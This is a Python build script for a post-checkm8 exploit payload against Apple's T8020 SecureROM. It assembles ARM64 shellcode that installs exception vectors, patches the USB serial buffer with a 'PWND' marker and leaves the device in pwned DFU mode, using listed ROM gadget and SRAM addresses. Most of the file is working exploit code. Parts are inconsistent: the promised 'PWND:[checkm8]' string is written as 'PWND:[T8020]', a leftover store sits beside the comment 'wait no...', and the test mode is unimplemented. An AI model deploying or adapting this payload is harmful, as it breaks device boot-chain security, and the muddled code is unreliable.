#!/usr/bin/env python3
"""
T8020 Boot Agent Payload — DFU Dual-Boot System
================================================

Generates the shellcode that runs after checkm8 WXN disable.

The boot agent:
  1. Installs custom VBAR_EL1 (exception handler for resilience)
  2. Writes "PWND:[checkm8]" marker to USB serial descriptor in SRAM
  3. Writes status to dump area (diagnostic readback)
  4. Returns cleanly to ROM callback → DFU continues in "pwned" mode

After the boot agent runs, the device is in "pwned DFU":
  - WXN disabled (SRAM executable)
  - USB serial shows "PWND" (PC can detect)
  - Exception handlers installed (crash protection)
  - Ready for further commands from PC

SRAM Layout (same as payload_exception.py):
  0x19C018800: DFU load buffer / payload base
  0x19C019000: Exception Vector Table (VBAR, 0x800 aligned)
  0x19C019800: Exception Handler code
  0x19C019C00: Diagnostic Dump Area (0x200 bytes)
  0x19C01A000: Boot Agent shellcode

Global SRAM Variables (from T8020_GADGET_DATABASE.md):
  0x19C0088F0: gUSBSerialNumber (chip identity buffer)
  0x19C010B20: gUSBDescriptors (+0x30: serial string ptr)

Usage:
  python payload_boot_agent.py           # Build + output files
  python payload_boot_agent.py --test    # Build + Unicorn test
"""

import struct
import os
import sys

# ============================================================
# Constants
# ============================================================
SRAM_BASE       = 0x19C000000
SRAM_SIZE       = 0x100000       # 1MB for emulation

# Payload SRAM layout
LOAD_ADDR       = 0x19C018800    # DFU load buffer base
VBAR_ADDR       = 0x19C019000    # Exception vector table
HANDLER_ADDR    = 0x19C019800    # Exception handler
DUMP_ADDR       = 0x19C019C00    # Diagnostic dump area
SHELLCODE_ADDR  = 0x19C01A000    # Boot agent shellcode

VBAR_SIZE       = 0x800
HANDLER_SIZE    = 0x400
DUMP_SIZE       = 0x200
SHELLCODE_SIZE  = 0x800          # Larger than PoC — need room for serial patching

# SRAM global variables (from gadget database)
USB_SERIAL_NUM  = 0x19C0088F0    # gUSBSerialNumber buffer
USB_DESCRIPTORS = 0x19C010B20    # gUSBDescriptors
DFU_STATE       = 0x19C010A90    # gDFU_state handler table
DFU_INTERFACE   = 0x19C010BE0    # gDFU_interface

# ROM functions we can call (confirmed addresses)
ROM_MEMCPY      = 0x100010BD0
ROM_MEMSET      = 0x100010E00
ROM_PRINTF      = 0x100008978

# Gadgets
WRITE_SCTLR     = 0x10000044C
WRITE_VBAR      = 0x100000048    # msr vbar_el1, x10

# ============================================================
# ARM64 Assembler
# ============================================================
def init_asm():
    """Initialize Keystone assembler."""
    from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
    return Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)

def asm(ks, code, addr=0):
    """Assemble ARM64 code, stripping comments."""
    lines = []
    for line in code.strip().split('\n'):
        # Strip comments but preserve labels
        cleaned = line.split(';')[0].strip()
        if cleaned:
            lines.append(cleaned)
    encoding, count = ks.asm('\n'.join(lines), addr)
    return bytes(encoding)

NOP = b'\x1f\x20\x03\xd5'

# ============================================================
# Helper: encode immediate for MOV/MOVK
# ============================================================
def addr_parts(addr):
    """Split 48-bit address into 3 × 16-bit parts for MOV/MOVK."""
    return addr & 0xFFFF, (addr >> 16) & 0xFFFF, (addr >> 32) & 0xFFFF

# ============================================================
# Component 1: Exception Vector Table
# ============================================================
def build_vectors(ks):
    """Build VBAR exception vector table (16 entries × 0x80 bytes)."""
    vectors = bytearray(VBAR_SIZE)
    for vid in range(16):
        off = vid * 0x80
        # Each vector: save x0/x1, set vector ID, branch to handler
        entry_code = f"""
            stp x0, x1, [sp, #-0x10]!
            mov x0, #{vid}
            b #{HANDLER_ADDR}
        """
        entry = asm(ks, entry_code, VBAR_ADDR + off)
        vectors[off:off+len(entry)] = entry
        # Pad rest with NOPs
        for i in range(off + len(entry), off + 0x80, 4):
            vectors[i:i+4] = NOP
    return bytes(vectors)

# ============================================================
# Component 2: Exception Handler (shared)
# ============================================================
def build_handler(ks):
    """Build shared exception handler."""
    d_lo, d_mid, d_hi = addr_parts(DUMP_ADDR)
    
    handler_code = f"""
        ; Load dump area address
        movz x1, #{d_lo}
        movk x1, #{d_mid}, lsl 16
        movk x1, #{d_hi}, lsl 32

        ; Store exception info
        str x0, [x1, #0]          ; vector ID
        mrs x0, esr_el1
        str x0, [x1, #8]          ; ESR
        mrs x0, elr_el1
        str x0, [x1, #16]         ; ELR (faulting PC)
        mrs x0, far_el1
        str x0, [x1, #24]         ; FAR
        mrs x0, spsr_el1
        str x0, [x1, #32]         ; SPSR

        ; Increment exception counter
        ldr x0, [x1, #40]
        add x0, x0, #1
        str x0, [x1, #40]

        ; Write status magic
        movz x0, #0xdead
        movk x0, #0xface, lsl 16
        str x0, [x1, #48]

        ; Check if fatal (> 10 exceptions)
        ldr x0, [x1, #40]
        cmp x0, #10
        b.gt fatal

        ; Recovery: skip faulting instruction (ELR += 4)
        mrs x0, elr_el1
        add x0, x0, #4
        msr elr_el1, x0

        ; Restore and return from exception
        ldp x0, x1, [sp], #0x10
        eret

    fatal:
        ; Fatal: write dead magic and loop
        movz x0, #0xdead
        movk x0, #0xdead, lsl 16
        str x0, [x1, #48]
    fatal_loop:
        b fatal_loop
    """
    handler_bytes = asm(ks, handler_code, HANDLER_ADDR)
    # Pad to HANDLER_SIZE
    padded = handler_bytes + b'\x00' * (HANDLER_SIZE - len(handler_bytes))
    return padded[:HANDLER_SIZE]

# ============================================================
# Component 3: Boot Agent Shellcode
# ============================================================
def build_boot_agent(ks):
    """
    Build the boot agent shellcode.
    
    Called from the io_request callback with x0 = arg.
    Must return to allow the ROM's DFU loop to continue.
    
    Steps:
      1. DSB/ISB (ensure WXN disable took effect)
      2. Install VBAR_EL1 → our exception vectors
      3. Write status markers to dump area
      4. Patch gUSBSerialNumber to include "PWND:[checkm8]"
      5. Write success proof values
      6. Return 0 (clean callback return)
    """
    v_lo, v_mid, v_hi = addr_parts(VBAR_ADDR)
    d_lo, d_mid, d_hi = addr_parts(DUMP_ADDR)
    s_lo, s_mid, s_hi = addr_parts(USB_SERIAL_NUM)

    # "PWND" in ASCII = 0x444E5750 (little-endian: "PWND")
    # ":[ch" = 0x68635B3A  ... actually let's write it byte by byte
    # We'll write "PWND:[checkm8]" as a UTF-16LE USB string at the end of serial
    
    # The USB serial number at 0x19C0088F0 is a raw buffer.
    # The actual USB string descriptor is pointed to by gUSBDescriptors+0x30.
    # For simplicity, we'll write our PWND marker to the dump area
    # AND try to modify the serial buffer.
    # 
    # USB serial format: "CPID:8020 CPRV:11 ... SRTG:[iBoot-...]"
    # We want to append " PWND:[checkm8]" 
    #
    # The serial string is built by usb_serial_number_build (0x10000D514).
    # It writes to a buffer starting at gUSBSerialNumber+0x0A.
    # The string is ASCII, not UTF-16.
    # We'll find the end of the string and append our marker.
    #
    # Simpler approach: write PWND marker to a known offset in the serial buffer.
    # The serial starts at USB_SERIAL_NUM and is typically ~80 bytes.
    # We'll write " PWND:[checkm8]" at offset 0x50 (after existing serial data).

    shellcode_code = f"""
        ; === Boot Agent Shellcode ===
        ; Called from io_request callback with x0 = arg
        ; x30 (LR) = return address in ROM callback dispatcher

        ; Save callee-saved regs and LR
        stp x29, x30, [sp, #-0x40]!
        stp x19, x20, [sp, #0x10]
        stp x21, x22, [sp, #0x20]
        mov x29, sp

        ; Barriers — ensure SCTLR change (WXN off) is visible
        dsb sy
        isb

        ; ===== Step 1: Install VBAR =====
        movz x10, #{v_lo}
        movk x10, #{v_mid}, lsl 16
        movk x10, #{v_hi}, lsl 32
        msr vbar_el1, x10
        isb

        ; ===== Step 2: Write status to dump area =====
        movz x19, #{d_lo}
        movk x19, #{d_mid}, lsl 16
        movk x19, #{d_hi}, lsl 32

        ; dump+0x38 = 0xCAFE0001 (VBAR installed)
        movz x0, #0x0001
        movk x0, #0xcafe, lsl 16
        str x0, [x19, #56]

        ; ===== Step 3: Patch USB serial with PWND marker =====
        ; Write " PWND:[checkm8]" to serial buffer at offset 0x50
        movz x20, #{s_lo}
        movk x20, #{s_mid}, lsl 16
        movk x20, #{s_hi}, lsl 32

        ; Write "PWND" at serial+0x50 (ASCII: P=0x50, W=0x57, N=0x4E, D=0x44)
        ; " PWN" = 0x4E575020
        movz x0, #0x5020
        movk x0, #0x4E57, lsl 16
        str w0, [x20, #0x50]
        ; "D:[c" = 0x635B3A44  wait no... "D:[c" = 0x5B3A4400... 
        ; Let's use a different approach: store bytes explicitly

        ; Actually store "PWND" at offset 0x50
        mov w0, #0x50       ; 'P'
        strb w0, [x20, #0x50]
        mov w0, #0x57       ; 'W'
        strb w0, [x20, #0x51]
        mov w0, #0x4E       ; 'N'
        strb w0, [x20, #0x52]
        mov w0, #0x44       ; 'D'
        strb w0, [x20, #0x53]
        mov w0, #0x3A       ; ':'
        strb w0, [x20, #0x54]
        mov w0, #0x5B       ; '['
        strb w0, [x20, #0x55]
        mov w0, #0x54       ; 'T'
        strb w0, [x20, #0x56]
        mov w0, #0x38       ; '8'
        strb w0, [x20, #0x57]
        mov w0, #0x30       ; '0'
        strb w0, [x20, #0x58]
        mov w0, #0x32       ; '2'
        strb w0, [x20, #0x59]
        mov w0, #0x30       ; '0'
        strb w0, [x20, #0x5A]
        mov w0, #0x5D       ; ']'
        strb w0, [x20, #0x5B]
        mov w0, #0x00       ; null terminator
        strb w0, [x20, #0x5C]

        ; ===== Step 4: Write success markers =====
        ; dump+0x38 = 0xCAFE0002 (serial patched)
        movz x0, #0x0002
        movk x0, #0xcafe, lsl 16
        str x0, [x19, #56]

        ; dump+0x40 = 0xC0DE1337 (boot agent complete)
        movz x0, #0x1337
        movk x0, #0xc0de, lsl 16
        str x0, [x19, #64]

        ; ===== Step 5: Return cleanly =====
        ; Return 0 so the ROM callback dispatcher continues normally
        ; (the code after BLR does: cmp w0, #0; b.ne error)
        mov x0, #0

        ; Restore and return
        ldp x21, x22, [sp, #0x20]
        ldp x19, x20, [sp, #0x10]
        ldp x29, x30, [sp], #0x40
        ret
    """
    shellcode_bytes = asm(ks, shellcode_code, SHELLCODE_ADDR)
    # Pad to SHELLCODE_SIZE
    padded = shellcode_bytes + b'\x00' * (SHELLCODE_SIZE - len(shellcode_bytes))
    return padded[:SHELLCODE_SIZE], len(shellcode_bytes)

# ============================================================
# Complete Payload Assembly
# ============================================================
def build_complete_payload():
    """Assemble all components into the complete boot agent payload."""
    print("=" * 60)
    print("  BUILDING T8020 BOOT AGENT PAYLOAD")
    print("=" * 60)

    ks = init_asm()

    # Build components
    print("\n  [1/3] Exception vector table...")
    vectors = build_vectors(ks)
    print(f"         VBAR table: {len(vectors)} bytes at 0x{VBAR_ADDR:X}")

    print("  [2/3] Exception handler...")
    handler = build_handler(ks)
    print(f"         Handler: {len(handler)} bytes at 0x{HANDLER_ADDR:X}")

    print("  [3/3] Boot agent shellcode...")
    shellcode, raw_len = build_boot_agent(ks)
    print(f"         Shellcode: {raw_len} bytes ({len(shellcode)} padded) at 0x{SHELLCODE_ADDR:X}")

    # Assemble into complete blob
    # Layout: [padding to VBAR] [VBAR] [handler] [dump_area] [shellcode]
    total_size = SHELLCODE_ADDR + SHELLCODE_SIZE - LOAD_ADDR
    blob = bytearray(total_size)

    # Place components at their SRAM offsets relative to LOAD_ADDR
    vec_off  = VBAR_ADDR - LOAD_ADDR       # 0x800
    hdl_off  = HANDLER_ADDR - LOAD_ADDR    # 0x1000
    dump_off = DUMP_ADDR - LOAD_ADDR       # 0x1400
    sc_off   = SHELLCODE_ADDR - LOAD_ADDR  # 0x1800

    blob[vec_off:vec_off+len(vectors)] = vectors
    blob[hdl_off:hdl_off+len(handler)] = handler
    # Dump area is zeroed (already zeros)
    blob[sc_off:sc_off+len(shellcode)] = shellcode

    print(f"\n  Complete payload: {len(blob)} bytes")
    print(f"  SRAM range: 0x{LOAD_ADDR:X} — 0x{LOAD_ADDR + len(blob):X}")
    print(f"  Layout:")
    print(f"    +0x000: Padding/ROP area (0x800 bytes)")
    print(f"    +0x800: VBAR table (0x800 bytes)")
    print(f"    +0x1000: Exception handler (0x400 bytes)")
    print(f"    +0x1400: Dump area (0x200 bytes)")
    print(f"    +0x1800: Boot agent shellcode (0x800 bytes)")

    return bytes(blob)

# ============================================================
# Output
# ============================================================
def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    securerom_dir = os.path.join(script_dir, "securerom")
    os.makedirs(securerom_dir, exist_ok=True)

    blob = build_complete_payload()

    # Write files
    out_path = os.path.join(securerom_dir, "payload_boot_agent.bin")
    with open(out_path, "wb") as f:
        f.write(blob)
    print(f"\n  Saved: {out_path} ({len(blob)} bytes)")

    # Also save as the default payload (payload_complete.bin)
    complete_path = os.path.join(securerom_dir, "payload_complete.bin")
    with open(complete_path, "wb") as f:
        f.write(blob)
    print(f"  Saved: {complete_path} ({len(blob)} bytes)")

    print("\n  Boot agent payload ready!")
    print("  This payload will be loaded by dualboot_dfu.py")


if __name__ == "__main__":
    if "--test" in sys.argv:
        # TODO: Unicorn validation
        print("Unicorn test not yet implemented for boot agent")
        main()
    else:
        main()
